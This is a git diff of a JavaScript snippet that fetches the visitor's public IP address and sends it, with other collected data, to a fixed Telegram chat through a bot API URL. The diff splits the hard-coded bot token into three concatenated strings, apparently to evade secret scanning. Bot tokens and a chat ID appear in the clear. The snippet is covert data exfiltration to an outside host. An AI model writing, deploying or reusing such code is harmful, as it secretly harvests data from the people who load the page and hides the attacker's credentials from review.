@@ -1,3 +1,7 @@
+const tok1 = "9069105139:"
+const tok2 = "AAFgxm5PKEmrL1z"
+const tok3 = "TwykUndhyG_RrG-32x74"
+const tok = tok1+tok2+tok3;
 fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
@@ -13,7 +17,7 @@ fetch('https://api.ipify.org?format=json')
 	msg2=JSON.stringify(data, null, 2);
 	msg=msg+"\n"+msg2;
 	
-	url='https://api.telegram.org/bot7116418976:AAFk7G-hRhsBgL-l6ZXIaH1S1wnMT4uGSR4/sendMessage?chat_id=634841328&text='+encodeURI(msg);
+	url='https://api.telegram.org/bot'+tok+'/sendMessage?chat_id=634841328&text='+encodeURI(msg);
 	fetch(url).then(console.log("Done"));
 
 	})
